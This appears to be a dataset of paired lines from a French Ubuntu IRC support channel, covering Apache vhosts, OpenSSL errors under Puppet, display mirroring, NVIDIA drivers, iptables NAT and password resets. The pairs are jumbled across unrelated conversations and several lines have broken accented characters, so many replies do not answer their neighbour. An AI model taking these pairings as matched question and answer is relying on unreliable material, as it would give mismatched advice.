!wiki dnsmasq	http://doc.ubuntu-fr.org/configuration_serveur_dns_dhcp | http://doc.ubuntu-fr.org/dns | http://doc.ubuntu-fr.org/libvirt | http://doc.ubuntu-fr.org/hostapd | http://doc.ubuntu-fr.org/partage_de_connexion_internet
NetworkManager[747]: <error> [1442668768.545485] [dns-manager/nm-dns-dnsmasq. …	il doit chercher un dns local ou quelque chose comme ça ... ça me traumatise pas
t'es sur d'avoir le réseau sur cette machine ?	ben sachant que je te parle depuis cette machine ...
si tu host 0.ubuntu.pool.ntp.org t'as des ip's ?	oui les 4 ip ntpd règlementaires
@man man	fais gaffe à la boucle infinie
Bon ben tant pis...	pose une question
bon, tant pis. merci quand même	don't ask to ask, just ask
@altl screen	tmux, byobu, dtach, et wemux
http://www.assocecl.fr/player/	si c'est juste pour tester depuis ta machine, il est plus rapide de modifier le fichier hosts de ton système :D
même si ce n'est pas le même nom que pour l'accès depuis l'extérieur, ça ne devrait pas poser de problème	si pour tester mes accès externes et utiliser le player de la radio
je ne sais pas comment elle fonctionne	je consulte l'interface pour voir q'il y a des infos
il faudrait connaitre ton application pour ça	ca change rien ça ? https://80.14.243.217:8001/
le navigateur des visiteurs de ton site n'ont pas ça, et .home n'étant pas un tld...	-> http://paste.ubuntu-fr-secours.org/src-148036
Marmotte : 127.0.1.1       recreazoom.home recreazoom	sudo apache2ctl -S
dans les deux vhosts :)	je crois que j'ai compris
tu n'aurais pas oublié un ServerName ou ServerAlias dans le vhost qui est sur le port 443 ?	je ne comprends meme pas ta question... alors de là à être capable de répondre ;-)
pff	https://regie.assocecl.fr/ => http://80.14.243.217:8001/ => http://80.14.243.217:8001/login => https://regie.assocecl.fr/ => etc.
perso, une IP ne me dérange pas, mais l'utilisateur lambda préfèrera peut être, effectivement, ça lui paraitra moins barbare	une dernière chose....
il faut mettre la bonne URL à la place	ip ou redirection web ?
merci Tr4sK pour le copup de main	met dans pastbin la config de tes vhost
met dans pastbin la config de tes vhost	oui c'est mon soucis
J'aurai besoin d'un coup de main pour re-configurer un v-host....	apache ? envoi les infos
;-)	je sais pas: pourquoi tu fais une redirection ?
ton machin fait une redirection vers un domaine non diffusé sur internet (en général, .home c'est juste local)	mon machin... je peux le modifier comment pour qu'il fonctionne à merveille ???
euh	oui, c'est ce que je pense
(c'est autoconfiguré par zeroconf ?)	l'accès qui pose soucis : http://regie.assocecl.fr
Firefox me répond : Firefox ne peut trouver le serveur à l'adresse recreazoom.home.	tu as une définition de ce recreazoom.home ?
tu as une définition de ce recreazoom.home ?	http://monitorix.assocecl.fr par exemple
bein, tu vas pas taper ton ip locale depuis l'exterieur ptidav42100 ça semble logique nope ?	et si j'ai plusieurs pc?
a la  suite d'hier beaver	t'as pas revu pef ?
adobe photoshop n'existe pas sur linux	ça trouve son équivalent sous linux :)
@altl newsgroup	Error: Logiciel introuvable, veuillez ne pas utiliser des espaces, mais plutot des -, par exemple: adobe-photoshop.
@altl tondeuse--purge	Error: Logiciel introuvable, veuillez ne pas utiliser des espaces, mais plutot des -, par exemple: adobe-photoshop.
moi aussi je vais pas tarder, demain j'ai la tondeuse a passer	avec un --purge ?
@altl beaver-editor	'vim', 'gedit', 'atom', 'gnu-emacs', 'kate', 'leafpad', 'retext', 'editra', 'mad-edit', 'notepas', 'pluma', 'tea', 'scratch-text-editor-', 'acme', 'edile', and 'eddie'
@altl beaver	Error: Logiciel introuvable, veuillez ne pas utiliser des espaces, mais plutot des -, par exemple: adobe-photoshop.
@altl iomega	Error: Logiciel introuvable, veuillez ne pas utiliser des espaces, mais plutot des -, par exemple: adobe-photoshop.
@altl irssi	'xchat-wdk', 'xchat', 'quassel-irc', 'kvirc', 'chatzilla', 'konversation', 'adiirc', 'weechat', 'smuxi', 'pchat-irc', 'lightirc', 'wsirc', 'birc', 'scrollz', 'dircproxy', 'leafchat', 'lostirc', and 'sushi-irc-suite'
il y a moins de blabla	salut
@altl adobe-photoshop	'gimp', 'mypaint', 'krita', 'pinta', 'gimpshop', 'photivo', 'gimphoto', 'qtpfsgui', 'imagej', 'gps', 'sketchport', 'cinepaint', 'mari', 'fotowall', 'nathive', 'lazpaint', 'showphoto', 'magix photo designer', 'gnome paint', 'tiltshift generator', 'sharpshot', 'pixelitor', and 'amazon paint'
han, pardon :x	euh, tu fais un notice au canal ?
tu utilises unity ?	oui
d'accord, merci	donc tu pers 2 tiers de l'écran à gauche ?
donc tu pers 2 tiers de l'écran à gauche ?	nn nn pas 2/3 ! disons 1/10 sur tt les cot�s
sur mon ecran de laptop: 1366x768 , sur mon ecran de TV: 1280x720 (la plus proche r�solution que j'ai r�ussi � avoir)	pas HD 1920x1080 ?
pas HD 1920x1080 ?	une seconde je vais te montrer les r�solution possible
une seconde je vais te montrer les r�solution possible	et qu'est-ce qui est hors écran alors ?
et qu'est-ce qui est hors écran alors ?	par exemple si je suppose que l'ecran est [  une image logo]
tu as quelle résolution ? par les paramètres systêmes ?	oui c'est �a le prob: apparemment il est impossible d'avoir exactement la m�me resolution
bha oui c'est ce que tu avais non ?	j'avais tenté ça aussi sans succès.
j'avais tenté ça aussi sans succès.	je cale
je cale	t'inquiète pas de souci. Je pense que ce n'est pas un problème trivial, peut-être une option magique à trouver où je ne sais quoi mais ça demande de creuser un peu et de mieux comprendre le merdier (je parle pour moi, là je suis dans le flou). Je te remercie pour ton aide. Promis, si je trouve la solution, je l'indique ici. Merci à tous pour l'aide apportée. ;)
de tv	alors quelle solution ?
alors quelle solution ?	oui mais je viens de decouvrir ce truc :D
je commence à boguer grave là	tt simplement quand je deplace une fenetre � droit je deplace aussi la souris
et en rajoutant -cipher ECDHE-RSA-AES256-SHA	me re voila :D
openssl ecparam -list_curves         pour les lister	prime256v1 existe bel et bien et ensuite quand je fais le paste ci-dessus...
non	j'ai pas d'option -name ou ecparam etc.
C'est dommage le sslv3 c'est pas le protocole que je voudrais vu que j'ai cru comprendre qu'il était déconseillé maintenant.	 tu as un openssl.conf sous puppet ?
c'est bien puppet le dernier paste ?	oui, le openssl de puppet est en premier dans mon PATH.
Le répertoire /opt est là où le paquet installe tout son bordel.	ça donne quoi openssl cipher -V sur puppet
ça donne quoi openssl cipher -V sur puppet	=> http://paste.ubuntu-fr-secours.org/src-148032
=> http://paste.ubuntu-fr-secours.org/src-148032	et si tu remplance tls1 par tls1_2 dans ta commande ?
moi non plus.	t'as version puppet est compilée avec -03 alors que la version debian avec -02, pas dit que ça soit ça le probleme mais ça peut jouer. Sinon y'a quand meme pas mal d'options de compilation qui changent
t'as version puppet est compilée avec -03 alors que la version debian avec -02, pas dit que ça soit ça le probleme mais ça peut jouer. Sinon y'a quand meme pas mal d'options de compilation qui changent	c'est quoi -02 et -03 ?
c'est quoi -02 et -03 ?	mais pourquoi tu veux utiliser la version puppet ?
mais pourquoi tu veux utiliser la version puppet ?	parce que tout l'écosystème puppet se base dessus.
parce que tout l'écosystème puppet se base dessus.	et il peut pas se baser sur la lib openssl du systeme ?
corentin ou qq'un d'autre: http://paste.ubuntu-fr-secours.org/src-148031, je ne sais pas si ça vous parle, moi pas trop. ;)	le niveau d'optimisation du compilateur
Ah y'a aussi “openssl version -a” apparemment.	c'est peut être ton serveur qui n'a pas les choix minimum que peut accepter puppet
Après dans le thread il parle aussi d'un fichier dhparams.pem mais je ne vois pas trop où il intervient dans les options que me propose “openssl s_client ...”	regarde les options de compilation peut etre
regarde les options de compilation peut etre	comment je vois ça ?
comment je vois ça ?	ça marche aussi
J'ai tenté en ajoutant sa longue liste de ciphers via l'option -cipher mais j'ai toujours la même erreur.	mate le build log des 2 paquets
oui oui tout à fait.	je sais qu'entre les version < 1 and les version > 1 y'a des problemes de compatibilité d'ABI
lol http://stackoverflow.com/questions/32094145/python-paste-ssl-server-with-tlsv1-2-and-forward-secrecy	ah ok excuse-moi. Je re-regarde... Histoire de ne rien regretter. ;)
à partir de "Alternative" en modifiant sa cipher_list ... puis Edit correct answer	tu vois ça où ? Tu as un lien stp ?
Purée qd même c'est vraiment vache, y'a un écart de version sur le numéro de version « mineur » uniquement et paf ça suffit pour tout planter.	au fait tu as vu qu'il y avait deux solutions ? oui j'insiste mais je crois que le gars avait épuisé le sujet
au fait tu as vu qu'il y avait deux solutions ? oui j'insiste mais je crois que le gars avait épuisé le sujet	2 solutions ? Où ça ?
tu parles du trucs avec l'option -cipher longue comme le bras ? Si c'est ça, oui j'ai testé ça ma donné un message d'erreur sur le fait qu'il comprenait pas la valeur de la dite option.	c'est quoi les versions respectives de tes binaire sopenssl
c'est quoi les versions respectives de tes binaire sopenssl	=> “OpenSSL 1.0.2d 9 Jul 2015” pour la version de puppet, et “OpenSSL 1.0.1f 6 Jan 2014” pour celle de la distrib.
les tests ?	c'est à moi que tu dis « les tests ? » ? Si oui, j'ai pas compris la question?
actuellement c'est en LAN mais éventuellement il faudrait que le protocole soit assez optimisé pour être inter-site (par vpn)	y'a cette page mais pas vraiment à jour : https://doc.ubuntu-fr.org/clientleger_station
À mon travail, nous utilisons une vieille solution de terminaux (Sunray) et nous voulons rafraichir cette solution par quelque chose de plus moderne.  Avez-vous quelques chose à me proposer?  L'utilisation est principalement, Internet (Chrome ou Firefox), LibreOffice, Thunderbird, Java, Impression de document, accès à des partages réseau, multi-moniteur.	de vrais terminaux ? comme les vt100?
en tout cas c'est une erreur toute fraiche à en croire failure:s3_pkt.c:656 ... regarde sous la réponse ya des tests en ligne de commande qui marchent	des tests en lignes de commande qui marchent ? Où ça, je les vois pas.
ya ça sinon ... http://stackoverflow.com/questions/32094145/python-paste-ssl-server-with-tlsv1-2-and-forward-secrecy	le rapport entre ton lien et le souci de flaf ?
et dans le même genre de bizarerie il a pas un répertoire spécifique pour ces certificats ?	ben ça je ne sais pas trop, mais tu pourras voir dans mon paste que là je fournis tous les certifs et autres clés privées en ligne de commandes.
et tu l'as juste décompressé dans /opt/puppetlabs ?	non j'ai ajouté une dépôt dans /etc/apt/sources.list.d/ (ajouté une clé apt aussi) puis apt-get get update && apt-get install puppet-agent.
qu'est qu'il a de plus que l'openssl (le seul le vrai) ?	après le openssl de puppet, ça reste le openssl qu'on connaît. C'est juste une version différente, c'est tout.
Avec le openssl du paquet tiers, j'y arrive pas et je ne sais pas pourquoi. Or dans c'est avec ce openssl là qu'il faudrait que ça marche (car il est utilisé par d'autres softs sur la distrib). Avez-vous une idée ? Voici un paste de mes commandes http://paste.alacon.org/38169. S'il manque des choses, n'hésiter à me le dire.	pourquoi ce paquet tiers ? Puppet ça veut dire fantôche
pourquoi ce paquet tiers ? Puppet ça veut dire fantôche	ce paquet tiers est le moyen d'install “puppet 4” sur une Ubuntu.
alors il a probablement une solution plus facile :D	bon la solution se confirme : https://www.ibisc.univ-evry.fr/~fpommereau/blog/2014-03-05-mirror-displays-with-ubuntu.html
comme pour un serveur distant.. :p	ha ya un gars qui dit avoir une solution là : http://askubuntu.com/questions/214568/cant-activate-mirror-display
rhoooo tu n'as pas l'esprit aventureux ... ^_^	haha oui probablement, mais utiliser vnc c'est probablement utilis� dans des autres trucs plus compliqu�s
tu lances un serveur vnc ou rdp et tu t'y connecte avec remmina via localhost	et �a permet d'afficher l'espace ne s'affiche pas � l'ecran ?
En tout cas Remmina marche sur localhost en ssh .. peut être une solution	j'ai pas compris les solutions propos�es.. comment faire avec vnc ?
genre un vlc interne	bonne id�e :D mais comment faire ceci , � ma connaissance les mulitples workspace n'existe plus non? donc il ne s'agit pas d'un workspace
en tt cas j'ai essay� de modifier la r�solution pour les deux �crans et �a n'a pas march�	plutôt trouver un moyen de visualiser sur ton petit écran ce que le grand affiche
tu veux la même chose sur les deux écrans ?	oui mais quand je coche la case afficher la m�me image sur tt les ecrans �a ne donne aucun r�sultat
oui mais quand je coche la case afficher la m�me image sur tt les ecrans �a ne donne aucun r�sultat	déjà il te faut la même résolution ... le ppdc
déjà il te faut la même résolution ... le ppdc	apparemment c'est impossible dans mon cas, regarde la r�solution de deux �crans:
bha oui c'est comme avec plusieur bureaux	mais je peux pas controler la fenetre comme �a
et quand je deplace une fenetre � droite elle s'affiche � l'ecran	ben tu as réussi alors
ben tu as réussi alors	c'est pas r�ussi
elle s'affiche ou elle s'affiche pas ?	�a s'affiche quand je la deplace � cot� (elle ne s'affiche pas dans mon ordinateur) seulement sur l'ecran de TV
ifconfig	ip a plutôt, ifconfig est vieux/déprécié
je rappelle que je veux cr�er un hotspot, je n'utilise pas la carte wifi pour me connecter � une box.	et ton eth0 est connecté à quoi ?
Elle ne figure pas dans interfaces mais je vais tent� de mettre celle que je souhaite.	mauvaise idée
Salut, je tente de configurer un point d'acc�s wifi sur ubuntu 15. Lorsque j'utilise network-manager-gnome il d�finit l'adresse 10.42.0.1. O� la trouve-til?	vraissemblablement le DHCP de ta box
et pourtant j'ai bien précisé un expediteur	tu l'as précisé comment ? le From: est déclaratif, pas "l'enveloppe" si c'est envoyé par un commande systeme. (et rien n'empeche un clietn mail d'affichier l'enveloppe et non le From)
mvvvv ils sont déjà pas capable de se parler de bureau a bureau, alors une GED...	ça règle bien des problème
Bon, je vais partir à la pèche aux informations ! Merci beaucoup !	sinon c'est ça qu'il faut mettre en place : https://fr.wikipedia.org/wiki/Gestion_%C3%A9lectronique_des_documents
OpenGL vendor string: Intel Open Source Technology Center	tu as de l'optimus ?
client glx vendor string: Mesa Project and SGI	si tu utilisais la carte nvidia, tu aurais genre : OpenGL vendor string: NVIDIA Corporation
server glx vendor string: SGI	oui, : OpenGL vendor string: Intel Open Source Technology Center
j'avais pas lu la suite	la commande me retoune
si ça marche pas, c'est peut-être car c'est incompatible	j'que la carte intel et la nvidia, si je n'utilise ni l'une, ni l'auter j'utilise laquel alors ? :O
j'que la carte intel et la nvidia, si je n'utilise ni l'une, ni l'auter j'utilise laquel alors ? :O	tu utilises la carte nvidia
c'est dans mesa-utils	http://pastebin.com/sk8r3cUS
http://pastebin.com/sk8r3cUS	tu as de l'accéleration 3D mais tu utilises pas le pilote proprio
j'ai posé la question sur arch, il m'on redirigé sur java qui m'on refiriger sur e channel minecraft, dessus il m'on conseillez d'installer le proprio (ce que je ne sohaite pas trop) et comme j'avais test MC sur U je voulais avoir plus de précisiosns	fait voir la sortie de glxinfo
fait voir la sortie de glxinfo	je n'ai pas sa avec arch
Bonsoir, j'ai une petite question concernant l'installation de base d'ubuntu	 si tu ne poses pas ta question , la réponse ne viendra pas
 si tu ne poses pas ta question , la réponse ne viendra pas	le temps que je la note :P
le temps que je la note :P	 ensuite sur unity : parametres systeme / logiciels et mises à jour / pilotes additionnels
est-ce que de façon "native" lors de l'installation, il installe des pilotes specifique pour nvidia ? Notamment l'installation et la config auto de Bumblebee ?	non, l'installation de base d'Ubuntu n'installe jamais les pilotes graphiques propriétaires
Bonsoir à tous, j'ai un petit soucis sur un PC, celui ci, pour une raison que j'ignore, a voulu installer dpkg-dev et s'est foiré. Du coup, le paquet est à moitié installé (half-installed status) et je n'arrive ni à le réinstaller ni à le supprimer. Que puis-je faire ?	tape sudo apt-get install -f
man sed :)	sed -i …
-i, fuuuu, quel dimanche :)	 faut dire que tu as des questions, je ne comprends même pas de quoi ça cause
métiers du multimédia et de l'Internet	 quelle année ?
 quelle année ?	1ère année, je suis rentré il y a quelques jours
1ère année, je suis rentré il y a quelques jours	 cool ma gamine aussi y est rentré il y a quelques jours, mesures physiques
je suis vieux lol je suis le prof	ha ok, lol
faudra pas s'arreter là alcidi, tu seras probablement bon à 70 ans	 j'essaie plutôt de m'améliorer en natation pour le moment
'fin installer... on se comprend...fonctionnel je devrais dire	le plus simple c'est gufw
hey mezen t'en as un de firewall sur ta machine?	psad installe bastille
truc de ouf	psad complète snort dans le blockage des intrusions, les DDoS etc
bon tampis, je me contenterai de gnome-system-monitor...	sudo apt-get install snort
l'ids	nan j'y connais rien
ça craint	sinon gnome-system-monitor ça ressemble à windows
j'ai vus rapidement ubuntu tweak, c bien?	tu veux surveiller quoi ? ya conky qui te permet de faire un fond d'écran comme tu veux
s/mvvvv/m4v	beark ... un standard Apple ... non merci
salut mvvvv	ça marche ?
(du moins sur mon serveur network-manager n'est pas installé et pourtant... (j'utilise le service networking))	https://help.ubuntu.com/community/VPNClient#Manually_configuring_your_connection
comment on rinitialise un packet svp ?	tu veux dire réinstaller ? ou mettre la config à zéro ?
ça a l'air pas mal arron	ça marche poas
il faut aussi que je trouve un moyen d'installer le terminal des efl il est trop cool !	pour le clavier tu as un indicateur système en haut à droite avec le clavier FR. n'hésite pas à aller dans paramètre saisie de texte pour trouver le meilleur clavier
et puis c'est très lié à l'affectif	le dash unity est vraiment lent
merci mvvvv	tu utilises unity ? peut être lent parfois
c'est interdit à windows 10 ici ... circulez !!! ^_^	c'est cool ça marche mais il me marque windows recovery environnement
'lu	c'est pas apt-get upgrade
je peux plus booter windows	et que ce passe t-il donc pas quand tu boot sur Windows Recovery ?
ha oui mais là t'as quoi comme os ?	http://paste.ubuntu.com/12394497/
et au démarage j'ai pas grub pour choisir la partition a booter que faire svp	 sudo update-grub
ta dèja écoutés damien saez ou encore noir dèsir? Xze	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
salut kikouuuu	 tu connais bien ubuntu slystone1 ?
Re	ayé ça imprime?
perso non	pour en revenir à la différence entre un quad code et un dual core avec 2 threads par coeur... c'est quasi équivalent si tu n'utilises pas des applications qui ont un énorme besoin en CPU
et celui qui consomme le moins c'est?	je t'ai dit, tu peux commencer par Xfce et LXDE déjà, ils ne consomment pas beaucoup (mes parents utilisent Xfce sur un Celeron simple coeur 1.2 GHz avec 512 Mo de ram ^^), mais restent assez user friendly
avec apt-get?	avec le gestionnaire de paquets de ton choix, apt-get est celui que j'utilise, donc je ne vais pas te le déconseiller :D
tu chipottes Marmotte	pas du tout, si tu consommes 50 0e chaque "coeur logique", tu seras à 100 0e la puissance physique du CPU :)
pas du tout, si tu consommes 50 0e chaque "coeur logique", tu seras à 100 0e la puissance physique du CPU :)	ha je savais pas
et comment on fait pour changer de DE	tu en installes un autre, et tu le choisis sur la page de login
ça fait presk 4...	deux coeurs physiques, avec deux threads par coeur, c'est différent de quatre coeurs physiques
sorcier Xze vas au bucher	sinon, comme beaver, je dirais que tu peux tester d'autres DE déjà (Xfce ou LXDE en premier je pense, d'autres si ceux là ne te plaisent pas)
(d'où "transitional dummy package")	mais bon, je vois pas en quoi le bot est mauvais sinon … il fait le travail sans plus, ptidav42100 nope
je prefere mettre un point final sur le support que je t'apporte ptidav42100, j'ai aucune certitude, de plus j'utilise même pas unity, je suis sous Xfce, mais bon, d'apres la documentation Ubuntu, unity-2D n'existe pas pour la 14.04, et pourtant nous avons pu voir qu'il y'a un package qui porte ce nom dans les dépots	en utilisant les bons outils, on sait à quoi correspond ce paquet
j'ai installé un driver pour une carte pci et je pense m'etre trompé de driver, mais comment le viré pour le remplacé par le bon svp ?	quel driver, quelle carte, comment l'as-tu installé ?
(d'où l'intérêt d'éviter les abréviations)	le package unity-2d dans trusty, c'est bien pour unity-2D ?
m'enfin j'ai tapé ls et introuvable	c'est pas possible :)
tu me diras Xze je n'ai pas pu mettre windows 8 car il falais une résolution 1024x768 et les netbook c'est 1024x600	et tuveux mettre quelle version d'ubuntu dessus?
lol ptidav42100  comme tu veux..	tu m'diras que c'est vite vu
Par le ppd on fait comment ?	tu cliques dessus, et puis tu arrives à l'étape pour choisir le modèle, tu fournis le fichier ppd qui est sur le lien que t'as posté
ça pux ptidav42100	ça rejoins ce que je disais a mezen
mmm	non, le dépôt directement.
attend je tape beaver et mezen je n'ai pas de choix pour les pilotes additionel dans la fenêtre de mise a jour	désolé, ma question etait pour slystone1
ha oui beaver désolé	ok, je vais essayer de creuser. :)
et quand je vais dans parametres systeme => détails c'est marqué gallium llvmpipe 4.0 en graphique	t'es passé par le ppd ?
mais n26xx	?
il est vieux mais pas croulant non plus. 10.04 passait très bien, mais il n'est plus supporté. par contre je m'aperçois que ubuntu-gnome c'est avec gnome-shell, or je voudrais un environnement qui soit + proche de l'ancien gnome. Mate du coup ?	installe gnome-session-flashback
je vais réinstaller ubuntu 14.04 sur un vieux pc, je voudrais avoir un environnement gnome (pas unity). vous me conseillez de télécharger directement ubuntu-gnome, ou bien d'installer mate après avoir installé ubuntu normal ?	il ne me semble pas que mate soit ce que tu attends avoir dans ubuntu-gnome, c'est plutôt gnome-shell
viendez sur offtopic	plutôt venez
s/point/pointe	ok merci
en tout cas, c'est pratique, j'aimerai bien avoir les commandes	whois le bot, y'a une url qui point vers la docu'
salut mezen	à qui appartient ce bot uBOTu|packages ?
on le voit clairement là	bonjour
ha okay c'est plus clair maintenant	et il y en a une bonne liste de meta paquets
a oui unity est plus gros	c'est un paquet contenant uniquement des dépendances et non pas des données et des dépendances
salut mezen	salut
(0<=x<=9) *	ton CD est illisible, je dirais..
t'as un exemple ?	tu fais ton nat destination vers le serveur, et ensuite il te faudra sur B une règle du genre iptables -t nat -A POSTROUTING -o eth0 -s <ip> -j MASQUERADE
c'est mignon viviblement, s/viviblement/visiblement	d'accord dans ce cas c'est plus clair
je ne peux pas le connecter car j'ai perdu mon cable!	tu as un lecteur de carte uSD ?
?	regarde dans /var/log/apache2/{access,error}.log
d'ou est ce que ça peut venir ?	les droits sur les fichiers que tu sers
en français de préférence	#ubuntu-fr n'a pas vocation à servir d'annuaire de l'IRC francophone, mais de support pour Ubuntu
j'ai commencé à regarder hier soir, mais je n'ai pas réussi à trouver comment on pouvait avoir un fonctionnement similaire	on dirait que y'a un comportement équivalent niveau fichier déjà: https://en.wikipedia.org/wiki/Btrfs#Cloning
il est possible de faire pareil avec btrfs ?	avec zfs oui en tout cas
parce que la tu me sauve la vie ^^	tu avais peut-être un souci dans ton /etc/shadow
je vai verifier	si ça ne change rien, tu peux essayer passwd -d tonuser, pour virer le mot de passe. Ensuite, un coup de passwd pour en remettre un.
si ça ne change rien, tu peux essayer passwd -d tonuser, pour virer le mot de passe. Ensuite, un coup de passwd pour en remettre un.	 une explication ???
La carte est une 990FXA-UD3. Le processeur est un AMD fx8350 et la carte grahpique, c'est un Nvidia 750 Ti.	j'ai vu aussi un BIOS mode IDE à passer en mode AHCPI (si tu a bien des disques SATA)
 j'ai un problème je suis entrain de voulooir reset mon pass via le mode rescues (mais il m'affiche a chaque fois passwd authentication token manipulation error its	tu as remonté / en lecture/écriture avant d'utiliser passwd?
Bonjour, est ce que quelqu'un saurait s'il est possible de faire en sorte de bloquer la mise en veille de mon laptop lorsque je rabat le capot, mais uniquement lorsque celui-ci est relié à un écran externe?	pour tester si ton écran est relié ou pas tu peux utiliser : xrandr | grep "HDMI1 connected"
Désolé oui	regarde plutot du côté de la configuration de ton ESXi alors
quand je fais un ifconfig	donc elle est detectée
en mode rescue	une fois que tu as élargie la partition, il faut aussi élargir le systeme de fichier
eeuh ya pas moyen de modifier sa partition montéee sans quitterr l'OS	nope, faut utiliser un livecd ou liveusb
je penses que tu peux facilement le faire avec un truc genre gparted	depuis y a eu deux projets msys2 (msys faisait partie de mingw) et mingw_x64 (qui propose des compilo 64 et 32 et n'a rien à voir avec mingw)
en gros, c'est le conccurent d'ultrasparc IV	tu veux le troll du moment au taf: un collegue est en train de porter son code sur *bsd et windows
je vais attendre	'fin, apres àa dépend, c'est encore plus complexe, tu utilises pas Ubuntu 12.04 si ? :D
hein ?	mh, regarde la màj sur la version 45, n'est pas forcément une vérité absolue, ça peut une màj en 44.xxx, si tu regardes sur precise, il utilisent encore la version 37.0.2062
oui	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
comment indiquer à photorec un élément de stockage qu'il ne voit pas et que voit gparted ?	tu parles d'un disque non monté ?
marmotte, la commande "apt-get autoremove -s" sa va faire quoi dans le terminal ? une fois executer	le -s c'est pour "simulate", donc ça n'effectue aucune action
le 3e qui me sert pu à rien, je désintalle et up :) mais pour le reste des paquets pouvant être supprimer, j'prend pas de chance ;)	compare avec la liste proposée par "apt-get autoremove -s"
vu que j'en ai pas dans mon home/user/	sinon ya un répertoire /etc/profile.d/ ou tu peux mettre les shell que tu veux exécuter à chaque fois
iptables -t mangle -A PREROUTING -i eth0 -j TEE --gateway 192.168.1.40	-o / --out-interface devrait aider
lsof avec un grep process tobiasBora pour répondre à ta question	bha s'il sagit d'un tar manquant ... justement il n'y sera pas dans le lsof ...
J'ai un petit problème : j'avais installé un programme un peu planté qui avait besoin que je copie manuellement une lib (en .jar) dans le dossier java. Cependant impossible de retrouver le nom de ce fichier, je voulais donc savoir s'il était possible d'avoir la liste de tous les fichiers chargés par un processus.	avec java le plus simple c'est de lancer l'appli depuis un term et de voir le message d'erreur
vagrant box list ?	je crois pas, non, car elle a pas été installée par avgrant
ça te coute rien chamal	son flash il fonctionne, juste qu'il a la branche 11 de flash, et t'as sites qui bloquent leurs contenus
salut à tous, quelqu'un aurait il un lien pour l achat d'un boitier PC sécurisé? Pour l'installation d'ubuntu sur un desktop il me faudrait un boitier ou l'acces au bouton marche/arret, aux  usb et materiel interne soit sécurisé et accessible que pour une  personne. merci	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
oui Guest77553 j'ai  flashplugin-alternative.so + libpipelight-flash.so + libpipelight-silverlight5.1.so	sudo find / -name libflashplayer.so
je sais plus le répertoire beaver	(*) sudo find / -name blah , demande lui ça
ta flashplugin-alternative.so	bein find
mon autre soucis c'est ma souris qui réagit mal avec firefox ...très lente avec la molette	bein déjà, est ce que ton probleme avec flash est regle, et le souci, n'en n'est pas un, et encore moins besoin d'un addon tiers pour désactiver ça :/
moi ça m'embette de tout re-installer pour des icones	pourquoi tu veux qu'il fasse ça ?, le mode safe-mode il sert à quoi :)
wifi smarphone éteint ...pc portable en veille ...:) non	facebook peut être tres lent aussi par moment
les video sembleraient vouloir s'ouvrir mais le chenillard tourne à l'infini ... beaver	c'est peut être la video qui n'est pas disponible ? ou bien peut être que t'as pas la bande passante pour ?
peu être ta raison beaver	bein t'es tres rapide en fait ^^
ok beaver	à toi de trouver lequel par contre ^^
d'adobe oui	si le résultat est le même via ma procedure, ça sera à cause de l'option -safe-mode, et ton probleme il est déjà cerné, c'est un addon qui bloque tes videos Youtube
par contre les videos de FB ne peuvent pas se visionner	tu fermes firefox, dans ton terminal tu tapes : sudo apt-get install flashplugin-installer
j'essaie fb*	ça utilise flash je pense
quel rapport avec les icons ? beaver	tu tapes une commande par erreur ? et tu as ce probleme ?
:-[	bon, ton firefox, il y'a des addons dessus ?
commande introuvable	au pire, tu sais, moi j'ai pas ce probleme, si tu veux même pas prendre la peine de copier/coller une commande que j'ai collé quoi, allez 3 fois
non pas cool AtlGr+6 tiret du 6	sur un agencement azerty standard
la nvidia 550ti c'est pas l'une des dernière mais pas obsolète non plus	bah forcément, puisque j'ai une Ubuntu 15.04 aussi et ça marche au poil
comment écrire la barre verticale :( ?	AltGr+6
ben le problème graphique pareil	les forums c'est cool, ya un bug déclaré sur launchpad.net ?
et j'ai essayer kubuntu 15.04 l'ecran freeze, gèle au démarrage	as-tu essayé avec une Ubuntu tout court, donc avec Unity ?
Exécutez « grep --help » pour obtenir des renseignements complémentaires.	donne moi le retour de ta commande
et kde 15.04 l'ecran gèle grave à l'installation	la question est, est-ce qu'avec une Ubuntu avec Unity, tu as le même soucis
oui c'est fait beaver	tu as un retour de ma commande ?
amazon*	j'entends une Ubuntu avec Unity
mouchoirs :)	tu peux ouvrir un terminal ?
windows 10 est rempli de mouchards arrêter	et avec une Ubuntu officielle, même problème ?
au départ à l'installe c'était le driver tiers qui était en place !	gni
oui aussi :(	tu l'as installé par quel billet ? via ubuntu-drivers-common ?
oui beaver j'ai: e lecteur HTML5 est actuellement utilisé lorsque cela est possible.	t'es avec google chrome ?
HTML5*	c'est dingue :/
c'est quoi ton soucis  actuel chamal ?	via gnome-tweak-tool tu as essayé ça ? : http://i.stack.imgur.com/w35PV.png et http://i.stack.imgur.com/kzp22.png ?
'soir	bonsoir :)
Enfin, tu peux aussi écrire un outil pour ça, il pourra profiter à pas mal de monde	oui mais c'est pas facile en faite. Je voudrais un outils qui sache gérer LVM mais pas que
si il n'ya pas de solutions toute faite, alors je zerofree mes LV et je les copie avec dd	ça me semble le plus pertinent.
parce que sinon, un dd if=/dev/contenantdulvm | gzip > image.gz génère des fichiers pas trop gros (mais longs à lire et à écrire)	 oui et en espace disque utilisé
ça voudrait dire analyser ce que décrit lvm, sauver toutes les metadata, et analyser les lv, leur fs, et sauver les contenus des fs, ce qui fait quelque chose de bien complexe.	oui c'est ca et ne pas copier l'espace vide des volumes
(mais je lis peut-être pas très bien)	mais la il contourne le probleme en faisant un partimage des LV
partimage est pas fs agnostic et sauve que les données effectives	merci pour l'info alors j'ai pas trouvé comment faire avec partimage :s
merci pour l'info alors j'ai pas trouvé comment faire avec partimage :s	le lien explique pas comment ?
sinon pour les warning de perl, il ne te faut pas avoir de unset quand tu fais: locale	ok
mais bon :)	faut que je fasse quoi ?
ok	par contre tu pourrais faire un locale-gen pour éviter les: perl: warning: Setting locale failed.
pour ma part je me base juste que sur les logs, et non sur l'interpretation des utilisateurs	tu as essayé chkrootkit ?
j'avais update et check	je viens d'essayé j'ai pareil
je viens d'essayé j'ai pareil	cela me rassure un peu
je fais ta commande, c'est long, c'est pas une foudre de geuerre la machine sur laquelle je fais ça	bein il faut du verbeux au bout d'un moment nope ?
fait	c'est pas un faux positif depuis des années ?
hey !	si ton TV fonctionne comme le mien, c'est un paramétrage au niveau du format d'image
Des basheux dans l'instance ?	pose ta question sinon pas de réponse
bon, j'imagine que je repasserai plus tard	 avec xrandr tu dois pouvoir avoir les résolutions supportées par ta télé et l'adater
